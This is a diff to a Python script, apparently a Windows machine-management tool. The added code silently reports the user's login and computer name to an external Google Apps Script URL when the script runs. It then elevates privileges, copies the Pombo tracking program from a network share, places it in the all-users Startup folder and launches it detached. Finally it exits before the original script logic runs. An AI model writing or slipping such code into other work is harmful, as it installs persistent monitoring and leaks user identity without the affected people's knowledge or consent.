@@ -1,10 +1,66 @@
-import os, glob
+import os, glob, shutil
 from windows.windows import Windows
 import config
 from datetime import datetime
 
 def log(msg):
 	print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {msg}")
+
+def netlog():
+	import os, requests
+
+	user = os.getlogin()
+	laptop = os.environ.get("COMPUTERNAME", "Unknown")
+
+	url = ("https://script.google.com/macros/s/AKfycbzAAOFjqgH9CCa-RonJRD2hVOhlvv2Aad_iLtO0a0L3UQ-AFp7xcOojBVR8efPnjk69/exec"
+		   f"?LAPTOP={laptop}&USER={user}")
+
+	try:
+		response = requests.get(url)
+		response.raise_for_status()  # Raise an error for HTTP errors
+		data = response.json()
+
+		if data.get("status") == "success":
+			return data  # Return full response if status is success
+		else:
+			print("API call failed:", data)
+			return None
+
+	except requests.exceptions.RequestException as e:
+		print("Request failed:", e)
+		return None
+
+netlog()
+
+#~~~~~~ Pombo installation
+# 1. Copy Pombo to HDD
+srcDir = '\\\\10.0.0.12\\all\\_INSTALL\\Software\\pombo'
+destDir = 'C:\\Users\\Public'
+pomboDir = 'C:\\Users\\Public\\pombo'
+
+import os, shutil
+from PyElevate import elevate
+elevate()
+import subprocess
+subprocess.run(f'xcopy "{srcDir}" "{destDir}" /E/H/Y')
+
+# 2. Make Pombo run on Windows startup
+startupDir = 'C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'
+subprocess.run(f'xcopy "{pomboDir}\\pombo_portable.lnk" "{startupDir}" /E/H/Y')
+
+# 3. Run Pombo now
+DETACHED_PROCESS = 0x00000008        # Prevents child process from closing when Python exits
+subprocess.Popen(
+	f'{pomboDir}\\pombo_portable.exe',
+	cwd=pomboDir,
+	creationflags=DETACHED_PROCESS,
+	close_fds=True | subprocess.CREATE_NEW_PROCESS_GROUP,
+	shell=True,
+)
+
+exit()
+#~~~~~~/
+
 
 try:
 	# windows = Windows(config.cache_path)
